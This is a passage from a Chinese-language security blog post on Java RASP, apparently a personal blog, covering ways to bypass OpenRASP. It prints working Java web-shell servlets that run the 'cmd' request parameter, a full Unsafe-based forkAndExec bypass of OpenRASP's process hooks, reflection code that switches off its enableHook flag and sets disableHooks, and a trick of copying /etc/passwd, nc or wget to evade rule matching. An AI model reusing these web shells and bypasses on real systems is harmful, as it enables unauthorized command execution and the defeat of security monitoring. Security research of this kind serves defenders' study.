<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">    byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br></pre></td></tr></table></figure>

<p>传入cmd参数为whoami，以下是结果：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7961ddac507cc872447.jpg" alt="image-20230806200633686"></p>
<p>符合预期，按照正则表达式没有进行过滤。之后传入cmd&#x3D;cat &#x2F;etc&#x2F;passwd，结果为：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7a11ddac507cc873e11.jpg" alt="image-20230806200744779"></p>
<p>接下来我们尝试bypass。在bypass之前，我们再回想一下OpenRASP的hook流程？比如这里提到的命令执行部分，OpenRASP在UNIXProcess或者ProcessImpl类的初始化方法处插入了自己的防御代码，使得我们无法执行黑名单中的命令。那麻烦思考一下，既然它在UNIXProcess或者ProcessImpl类的初始化方法中插入了防御代码，那么我们有没有一种办法能够不需要调用这两个类的初始化方法就能直接获取UNIXProcess或者ProcessImpl类呢？当然是有的，在Java中有一个叫Unsafe的类，它提供了非常底层的<code>内存、CAS、线程调度、类、对象</code>等操作、<code>Unsafe</code>正如它的名字一样它提供的几乎所有的方法都是不安全的。而Unsafe类中有一个allocateInstance方法，它可以无视构造方法从而直接创建这个类的实例。接下来给大家做个示范：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String[] commands = request.getParameterValues(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="comment">//反射获取unsafe实例</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取UNIXProcess实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[][] args = <span class="keyword">new</span> <span class="title class_">byte</span>[commands.length - <span class="number">1</span>][];</span><br><span class="line">        <span class="type">int</span>      <span class="variable">size</span> <span class="operator">=</span> args.length; <span class="comment">// For added NUL bytes</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; i++) &#123;</span><br><span class="line">            args[i] = commands[i + <span class="number">1</span>].getBytes();</span><br><span class="line">            size += args[i].length;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] argBlock = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">        <span class="type">int</span>    <span class="variable">i</span>        <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span>[] arg : args) &#123;</span><br><span class="line">            System.arraycopy(arg, <span class="number">0</span>, argBlock, i, arg.length);</span><br><span class="line">            i += arg.length + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span>[] envc                 = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span>[] std_fds              = <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">launchMechanismField</span> <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;launchMechanism&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">helperpathField</span>      <span class="operator">=</span> processClass.getDeclaredField(<span class="string">&quot;helperpath&quot;</span>);</span><br><span class="line">        launchMechanismField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        helperpathField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">launchMechanismObject</span> <span class="operator">=</span> launchMechanismField.get(processObject);</span><br><span class="line">        <span class="type">byte</span>[] helperpathObject      = (<span class="type">byte</span>[]) helperpathField.get(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">ordinal</span> <span class="operator">=</span> (<span class="type">int</span>) launchMechanismObject.getClass().getMethod(<span class="string">&quot;ordinal&quot;</span>).invoke(launchMechanismObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">forkMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;forkAndExec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;</span><br><span class="line">                <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">byte</span>[].class, <span class="type">int</span>.class,</span><br><span class="line">                <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">byte</span>[].class, <span class="type">int</span>[].class, <span class="type">boolean</span>.class</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        forkMethod.setAccessible(<span class="literal">true</span>);<span class="comment">// 设置访问权限</span></span><br><span class="line">        <span class="type">byte</span>[] CString = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(commands[<span class="number">0</span>] == <span class="literal">null</span>)&#123;</span><br><span class="line">            CString = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">byte</span>[] bytes  = commands[<span class="number">0</span>].getBytes();</span><br><span class="line">            CString = <span class="keyword">new</span> <span class="title class_">byte</span>[bytes.length + <span class="number">1</span>];</span><br><span class="line">            System.arraycopy(bytes, <span class="number">0</span>, CString, <span class="number">0</span>, bytes.length);</span><br><span class="line">            CString[CString.length - <span class="number">1</span>] = (<span class="type">byte</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pid</span> <span class="operator">=</span> (<span class="type">int</span>) forkMethod.invoke(processObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                ordinal + <span class="number">1</span>, helperpathObject, CString, argBlock, args.length,</span><br><span class="line">                <span class="literal">null</span>, envc[<span class="number">0</span>], <span class="literal">null</span>, std_fds, <span class="literal">false</span></span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 初始化命令执行结果，将本地命令执行的输出流转换为程序执行结果的输出流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">initStreamsMethod</span> <span class="operator">=</span> processClass.getDeclaredMethod(<span class="string">&quot;initStreams&quot;</span>, <span class="type">int</span>[].class);</span><br><span class="line">        initStreamsMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        initStreamsMethod.invoke(processObject, std_fds);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取本地执行结果的输入流</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getInputStreamMethod</span> <span class="operator">=</span> processClass.getMethod(<span class="string">&quot;getInputStream&quot;</span>);</span><br><span class="line">        getInputStreamMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> (InputStream) getInputStreamMethod.invoke(processObject);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">int</span>                   <span class="variable">a</span>    <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">byte</span>[]                b    = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">            baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        out.println(baos.toString());</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>之后我们再传入?cmd&#x3D;cat&amp;cmd&#x3D;&#x2F;etc&#x2F;passwd，结果如下：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7af1ddac507cc875daf.jpg" alt="image-20230806201152184"></p>
<p>对代码部分简略解释一下吧。首先我们通过反射获取一个unsafe实例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射获取unsafe实例</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">theUnsafeField</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">theUnsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) theUnsafeField.get(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<p>之后又获取了UNIXProcess实例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">processClass</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.UNIXProcess&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">    processClass = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">Object</span> <span class="variable">processObject</span> <span class="operator">=</span> unsafe.allocateInstance(processClass);</span><br></pre></td></tr></table></figure>

<p>因为我们创建此UNIXProcess对象时并未 通过其构造函数来获取，因此并未执行OpenRASP的hook代码，从而完成绕过！</p>
<h3 id="关闭OpenRASP开关"><a href="#关闭OpenRASP开关" class="headerlink" title="关闭OpenRASP开关"></a>关闭OpenRASP开关</h3><p>在一般的RASP产品中为了避免影响产品，都会设置一个开关，在OpenRASP中也不例外。OpenRASP的开关就是com.baidu.openrasp.HookHandler的enableHook字段：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7be1ddac507cc877c57.jpg" alt="image-20230807002521102"></p>
<p>在我们刚刚分析的hook流程中，有一个com.baidu.openrasp.HookHandler#doRealCheckWithoutRequest函数，在函数开始做了一个判断，就是判断OpenRASP的开关是否打开：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7ca1ddac507cc8793c4.jpg" alt="image-20230807002548473"></p>
<p>我们可以通过反射将这个字段设为<code>new AtomicBoolean(false)</code>，即关闭这个字段：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableHookFiled</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> enableHookFiled.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(enableHookFiled, enableHookFiled.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        enableHookFiled.set(cls.newInstance(), <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>(<span class="literal">false</span>));</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后成功bypass：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg" alt="image-20230807002758651"></p>
<p>那既然这个方法可行，那我们不妨找找在刚刚的hook流程中，我们还能通过反射更改哪些字段，从而中止hook流程？还记得我们之前提到的那个熔断开关吗？那个是RASP为了在CPU占比过高的情况下设置的。我们也可以通过调用以下方式手动设置熔断：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> Config.getConfig();</span><br><span class="line">config.setDisableHooks(<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>之后中止hook：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg" alt="image-20230807003115746"></p>
<p>与之类似的还有config类的cloudSwitch字段以及hookWhiteAll字段，这两个就交给读者了。</p>
<h3 id="cp命令绕过RASP"><a href="#cp命令绕过RASP" class="headerlink" title="cp命令绕过RASP"></a>cp命令绕过RASP</h3><p>以读取&#x2F;etc&#x2F;passwd为例，我们看一下OpenRASP的匹配规则：</p>
<p><img src="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg" alt="image-20230807003535721"></p>
<p>这里只是匹配了cat.{1,5}&#x2F;etc&#x2F;passwd，那加入我们使用cp命令将&#x2F;etc&#x2F;passwd复制到&#x2F;tmp&#x2F;passwd，然后再查看&#x2F;tmp&#x2F;passwd不就可以绕过了吗？</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cp /etc/passwd /tmp/passwd</span><br><span class="line">?cmd=cat /tmp/passwd</span><br></pre></td></tr></table></figure>

<p><img src="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg" alt="image-20230807003646953"></p>
<p>同理，我们可以将某些禁止使用的命令，如&#x2F;bin&#x2F;nc、&#x2F;bin&#x2F;wget等copy到别的位置，之后再进行调用来进行bypass。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章主要针对OpenRASP进行了启动流程的分析和Hook流程的分析，收获很大，算是RASP入门？时至今日，个人感觉RASP技术在大规模应用上仍然有比较大的困难。一方面就是令人诟病的性能原因，还有一方面要求安全人员对漏洞的原理必须深入到代码层面。因此感觉RASP技术可能就像Glassy师傅在KCon大会说得那样，不能像从前一样只是将恶意行为覆盖掉，因为恶意行为是不可穷举的，最好的解决办法就是在漏洞的入口点将攻击进行有效拦截。</p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://baidu.com">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RASP%E4%BB%8B%E7%BB%8D"><span class="toc-number">2.</span> <span class="toc-text">RASP介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OpenRASP%E7%A0%94%E7%A9%B6"><span class="toc-number">3.</span> <span class="toc-text">OpenRASP研究</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenRASP%E5%90%AF%E5%8A%A8%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">OpenRASP启动流程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenRASP-Hook"><span class="toc-number">3.2.</span> <span class="toc-text">OpenRASP Hook</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Demo-RASP%E5%AE%9E%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">Demo RASP实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-OpenRASP"><span class="toc-number">5.</span> <span class="toc-text">Bypass OpenRASP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Unsafe%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.</span> <span class="toc-text">Unsafe绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%97%ADOpenRASP%E5%BC%80%E5%85%B3"><span class="toc-number">5.2.</span> <span class="toc-text">关闭OpenRASP开关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cp%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87RASP"><span class="toc-number">5.3.</span> <span class="toc-text">cp命令绕过RASP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2023/08/06/JavaRASP/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&text=关于Java RASP的一些研究"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&is_video=false&description=关于Java RASP的一些研究"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=关于Java RASP的一些研究&body=Check out this article: https://r4inb00w.github.io/2023/08/06/JavaRASP/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&title=关于Java RASP的一些研究"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2023/08/06/JavaRASP/&name=关于Java RASP的一些研究&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2023/08/06/JavaRASP/&t=关于Java RASP的一些研究"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2023
    rainb0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://baidu.com">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
